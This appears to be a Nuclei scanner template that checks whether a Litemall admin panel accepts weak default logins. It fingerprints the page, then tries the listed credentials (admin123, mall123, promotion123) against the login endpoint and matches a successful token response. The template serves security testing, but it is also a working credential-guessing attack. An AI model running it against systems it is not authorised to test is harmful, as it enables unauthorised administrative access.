id: litemall-weak-password
info:
  name: Litemall Open Source Management System Weak Password
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password

variables:
  usernames:
    - admin123
    - mall123
    - promotion123
  passwords:
    - admin123
    - mall123
    - promotion123

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<title>litemall-admin</title>"
      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/admin/auth/login"
    headers:
      Content-Type: application/json
    payloads:
      username: '{{usernames}}'
      password: '{{passwords}}'
    body: |
      {
        "username": "{{username}}",
        "password": "{{password}}",
        "code": ""
      }
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "\"errmsg\":\"成功\""
      - type: word
        part: body
        words:
          - "\"token\""
      - type: word
        part: body
        words:
          - "\"adminInfo\""
      - type: status
        status:
          - 200
